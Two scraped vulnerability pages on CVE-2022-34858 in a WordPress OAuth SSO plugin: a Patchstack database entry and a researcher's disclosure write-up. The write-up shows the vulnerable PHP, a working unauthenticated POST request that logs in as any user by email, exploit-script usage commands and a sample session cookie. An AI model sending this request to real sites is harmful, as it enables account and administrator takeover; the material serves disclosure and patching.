=== Content from patchstack.com_36230f56_20250108_120715.html ===


[Pricing](https://patchstack.com/pricing/)
Solutions

[WordPress security

Instantly fix and mitigate vulnerabilities](https://patchstack.com/wordpress-security/)
[Plugin auditing

Paid auditing for WordPress vendors](https://patchstack.com/auditing/)
[Managed VDP

Start a security program for your plugin](https://patchstack.com/for-plugins/)
[Bug Bounty

Join the community and earn bounties](https://patchstack.com/bug-bounty/)
[Enterprise API

At scale monitoring and vPatching for hosts](https://patchstack.com/for-hosts/)
[Vulnerability database

The latest WordPress security intelligence](https://patchstack.com/database/)

[Login](https://app.patchstack.com/login)

[Start trial](https://app.patchstack.com/register?type=pro)

# WordPress OAuth 2.0 client for SSO Plugin <= 1.11.3 is vulnerable to Bypass Vulnerability

![Patch priority: high](https://patchstack.com/database/img/priority-high.svg)

High priority

vPatch immediately

![Vulnerable version](https://patchstack.com/database/img/vulnerable_version.svg)

<= 1.11.3

Vulnerable version

![Fixed](https://patchstack.com/database/img/fix-available.svg)

1.11.4

Fixed version

[![](https://patchstack.com/database/img/platforms/WordPress.svg)](https://patchstack.com/database/wordpress/plugin/oauth-client)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

02 August 2022

# Risks

CVSS 9.8

This vulnerability is highly dangerous and expected to become mass exploited.

##### 9.8

### Bypass Vulnerability

A bypass vulnerability could allow a malicious actor to bypass certain restrictions in the code.

This is a general description of this vulnerability type, specific impact varies case by case.
CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way, but it is not ideal for CMSs.

# Solutions

We advise to mitigate or resolve the vulnerability immediately.

![Protect your website(s)](https://patchstack.com/database/img/shield-star.svg)
### Automatically mitigate vulnerabilities and keep your websites safe

Patchstack has issued a virtual patch to mitigate this issue by blocking any attacks until
you have updated to a fixed version.

#### Get the fastest vulnerability mitigation with Patchstack!

[Get Started](https://patchstack.com/pricing/)

![Update to version X or later](https://patchstack.com/database/img/update-checkmark.svg)
### Update to version 1.11.4 or later.

Update to version 1.11.4 or later to remove the vulnerability.
Patchstack users can turn on auto-update for vulnerable plugins only.

# Details

Software

OAuth 2.0 client for SSO

Type

Plugin

Vulnerable versions

<= 1.11.3

Fixed in

1.11.4

OWASP Top 10

A2: Broken Authentication

Classification

Bypass Vulnerability

CVE

[CVE-2022-34858](https://www.cve.org/CVERecord?id=CVE-2022-34858)

Patch priority

High

CVSS severity

High
(9.8)

Developer

[Claim ownership](https://patchstack.com/for-plugins)

PSID

f26589749d3c

Credits

[![IstvÃ¡n MÃ¡rton](https://patchstack.com/database/img/logomark-small.svg)](https://patchstack.com/database/researcher/46444da6-46e2-4b6b-9eff-b801e5f3e5ba)

Required privilege

Unauthenticated

Published

2 August, 2022

[Vulnerability details](https://lana.codes/lanavdb/df23b19f-4134-41d3-8cb3-9d44189b461b/)

![Remove and replace software](https://patchstack.com/database/img/expand.svg)
Have additional information or questions about this entry?
Let us know.

#### Found this useful? Support IstvÃ¡n MÃ¡rton for reporting this vulnerability.

[Send thanks](https://www.buymeacoffee.com/lanacodes)

#### Found this report useful?

[Send thanks](https://www.buymeacoffee.com/lanacodes)

# Timeline

![Early warning sent out](https://patchstack.com/database/img/warning.svg)

Early warning sent out to Patchstack customers

02 Aug 2022

![Published by Patchstack](https://patchstack.com/database/img/info.svg)

Published by Patchstack

04 Aug 2022

Go to

[![WordPress](https://patchstack.com/database/img/platforms/WordPress.svg)
Plugin page](https://patchstack.com/database/wordpress/plugin/oauth-client)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

How can Patchstack provide the fastest protection?

Patchstack is one of the largest open-source vulnerability disclosers in the world. For example, in 2023 more than 70% of new WordPress vulnerabilities were originally published by Patchstack. This focus on research enables us to deploy vulnerability protection rules faster than anybody else.

What is virtual patching?

Patchstack vPatching auto-mitigates security vulnerabilities even when there's no official patch available. It's the fastest and most effective way to eliminate new security vulnerabilities without sacrificing performance.

Why would a hacker target my website?

Hackers automate attacks against new security vulnerabilities to take over as many websites as they can before users have time to patch and update. The attacks are opportunistic and victims are not chosen - everyone is a target.

What if my website has already been compromised?

We recommend reaching out to your hosting provider for server-side malware scanning or use a professional incident response service. Don't rely on plugin based malware scanners as they are commonly tampered with by malware.

# Weekly WordPress security intelligence delivered to your inbox.

![vPatch available](https://patchstack.com/database/img/envelope.svg)

Subscribe

### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

Â© 2025 Patchstack
[DPA](https://patchstack.com/data-processing-agreement-dpa/)
[Privacy Policy](https://patchstack.com/privacy-policy/)
[Terms & Conditions](https://patchstack.com/terms-and-conditions/)
![EU Logo](https://patchstack.com/database/img/eic-logo.png)

![](https://patchstack.com/database/img/logo.svg)
### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)

## Let us know if we have missed a vulnerability reported elsewhere

Report
![arrow right](https://patchstack.com/database/img/chevron-right.svg)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)
[Close](https://patchstack.com/database/)
## reCAPTCHA's verification failed!

## Thank you for contributing!

[Close](https://patchstack.com/database/)
![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)



=== Content from lana.codes_332d5148_20250108_120714.html ===

[Skip to content](#content)

[![Lana Report](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)](https://lana.report/)

* [Front Page](https://lana.report/)
* [Reports](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

1. [Lana Report](https://lana.report/)
2. [Publications](https://lana.report/publication/)

### OAuth 2.0 client for SSO by miniOrange WordPress plugin Authentication Bypass

REPORT ID: df23b19f-4134-41d3-8cb3-9d44189b461b

The plugin contains an Auth Bypass vulnerability. To bypass authentication, we only need to know the userâ€™s email address. Depending on whose email address we know, we may even be given an administrator role on the clientâ€™s website.

#### Letâ€™s check the plugin

The `mo_oauth_login_validate()` function includes the following request handling:

```
if ( isset( $_REQUEST['option'] ) and strpos( $_REQUEST['option'], 'mooauth' ) !== false ) {

	$user_email = '';
	if ( array_key_exists( 'email', $_POST ) ) {
		$user_email = sanitize_email( $_POST['email'] );
	}

	if ( $user_email ) {
		if ( email_exists( $user_email ) ) { // user is a member
			$user    = get_user_by( 'email', $user_email );
			$user_id = $user->ID;
			wp_set_auth_cookie( $user_id, true );
		} else { // this user is a guest
			$random_password = wp_generate_password( 10, false );
			$user_id         = wp_create_user( $user_email, $random_password, $user_email );
			wp_set_auth_cookie( $user_id, true );
		}
	}
	wp_redirect( home_url() );
	exit;
}
```

We can see from the code that if we specify `$_POST['email']`, the plugin will log the user in using the [`wp_set_auth_cookie()`](https://developer.wordpress.org/reference/functions/wp_set_auth_cookie/) function. No verification or authentication. Nothing.

The other problem with the plugin is that if we give an email address in the request that does not exist in the database, it will create a new user, even if registration on the WordPress website is not enabled.

#### Letâ€™s see how we can exploit this vulnerability

We only need to send a POST request to exploit this vulnerability.

The HTTP request to the <https://lana.solutions/vdb/miniorange-oauth-client/> which is a test WordPress website:

```
POST /vdb/miniorange-oauth-client/ HTTP/1.1
Host: lana.solutions
Content-Type: application/x-www-form-urlencoded

option=mooauth&[[emailÂ protected]](/cdn-cgi/l/email-protection)
```
#### The exploit script

I created a Python script that returns the WordPress logged\_in and auth cookie:

Source: [miniorange\_oauth\_client\_plugin\_vdb\_get\_exploit\_cookie.py](https://gist.github.com/lana-codes/c60c987c91d6b097d5e6e6ae95c02f48)

How to use:

```
python3 miniorange_oauth_client_plugin_vdb_get_exploit_cookie.py --client_url="https://lana.solutions/vdb/miniorange-oauth-client/" --email="[[emailÂ protected]](/cdn-cgi/l/email-protection)"
```

Run the above command in the Linux terminal.

We get something like this:

```
wordpress_logged_in_7c51fdb9c753be4972c4c2d647b5ded1=test%7C1656911674%7C2PsqjZ8FHWAqXOhJFcIU7yQPaQFOwVIpOfdZmQEyavx%7C940bbe2d2e3736724984b401f8f829811e541ffe3eb948f407aeeaae11f423f6
```

Then all we have to do is set the cookie using the browserâ€™s Developer Tools on the clientâ€™s website, which in our case isÂ <https://lana.solutions/vdb/miniorange-oauth-client/>

#### The professional exploit script

I also created a Python script with Selenium that exploits the vulnerability and automatically opens the webpage in Google Chrome:

Source: [miniorange\_oauth\_client\_plugin\_vdb\_exploit\_with\_selenium.py](https://gist.github.com/lana-codes/4ee8c5fc44f91e2e99ab1b215718cf71)

How to use:

```
python3 miniorange_oauth_client_plugin_vdb_exploit_with_selenium.py --client_url="https://lana.solutions/vdb/miniorange-oauth-client/" --email="[[emailÂ protected]](/cdn-cgi/l/email-protection)"
```

Run the above command in the Linux (desktop version) terminal.

#### Try it

Feel free to try and use the lana.solutions/vdb WordPress websites for testing. I have set the roles and capabilities, so you can only get low level access to the website.

Client:Â <https://lana.solutions/vdb/miniorange-oauth-client/>

Server:Â <https://lana.solutions/vdb/miniorange-oauth-server/>

#### Additional tests

I created a Postman request for exploit: [Postman Web â€“ MiniOrange Auth Request](https://www.postman.com/lanacodes/workspace/lanavdb-workspace/request/21538882-55901db6-5254-4dc4-ba32-da541d34dc37)

Can be used by anyone after fork. The required variables are stored in the collection.

### References

Source Code
<https://wordpress.org/plugins/oauth-client/>

Source Code (Archive)
<https://lana.solutions/files/oauth-client-1.11.3.zip>

Repository
<https://plugins.svn.wordpress.org/oauth-client/?p=2730613>

Lana Report
<https://lana.report/vulnerability/ac0bec28-ea44-46ee-9a35-d42273bce8dd/>

CVE
[CVE-2022-34858](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34858)

### Let's discuss

### Attributes

Catgory
WordPress Plugin

Vulnerability Discovered
2022-06-13

Post Published
2022-06-21

Post Updated
2023-05-27

Affected Version
<= 1.11.3

### Classification

Type
Authentication Bypass

### Researcher

Name
[IstvÃ¡n MÃ¡rton](https://lana.report "Visit IstvÃ¡n MÃ¡rtonâ€™s website")

Email
[[emailÂ protected]](/cdn-cgi/l/email-protection#51383f373e113d303f307f323e353422)

### Advertisement

### Support Us?

We would truly appreciate it if you bought us a bunny (food for a snow leopard).

[![buy me a bunny!](https://img.buymeacoffee.com/button-api/?text=buy me a bunny!&emoji=ðŸ°&slug=lanacodes&button_colour=0776eb&font_colour=ffffff&font_family=Lato&outline_colour=ffffff&coffee_colour=FFDD00)](https://www.buymeacoffee.com/lanacodes)

**Lana Passport**
Recommendation
Ã—

Hey, youâ€™re reading a publication about OAuth. Maybe youâ€™re interested in our secure OAuth server plugin?

[Buy itÂ ($89) from CodeCanyon.net](https://1.envato.market/lana-passport-oauth-20-server-for-wordpress)

![](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)

The Lana Report is a database containing vulnerabilities researched and published by Lana Solutions.

### General

* [Vulnerabilities](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

### Lana Solutions

* [Lana Codes](https://lana.codes/)
### Wordfence

* [Bug Bounty Program](https://wordfence.com/refer/lanareport)

### Socials

* [Telegram](https://t.me/LanaReport)
* [Twitter](https://twitter.com/LanaReport)

Lana Report Â© 2024 All Rights Reserved.

Made with ðŸ’™ by [Lana Codes](https://lana.codes/)


